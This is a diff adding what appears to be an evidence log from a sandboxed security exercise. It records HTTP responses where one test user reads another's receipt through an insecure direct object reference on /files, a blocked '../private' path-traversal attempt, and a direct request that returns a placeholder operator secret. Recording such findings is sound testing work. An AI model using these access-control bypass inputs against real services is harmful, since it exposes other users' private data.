@@ -1,0 +1,24 @@
+=== I-03/E-05: IDOR /files — alice reads bob's receipt and the private operator note ===
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.12.3
+Date: Thu, 29 Oct 2026 13:01:20 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 47
+
+{"content": "TEST_BOB receipt: lamp, 1500 RUB"}
+-- private note via user=../private path traversal --
+HTTP/1.0 500 Internal Server Error
+Server: BaseHTTP/0.6 Python/3.12.3
+Date: Thu, 29 Oct 2026 13:01:20 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 59
+
+{"error": "outside exercise sandbox", "type": "ValueError"}
+-- direct: user=private path=operator-note.txt (files/private/operator-note.txt doesn't exist, try path traversal with ../) --
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.12.3
+Date: Thu, 29 Oct 2026 13:01:20 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 40
+
+{"content": "TEST_ONLY_OPERATOR_SECRET"}
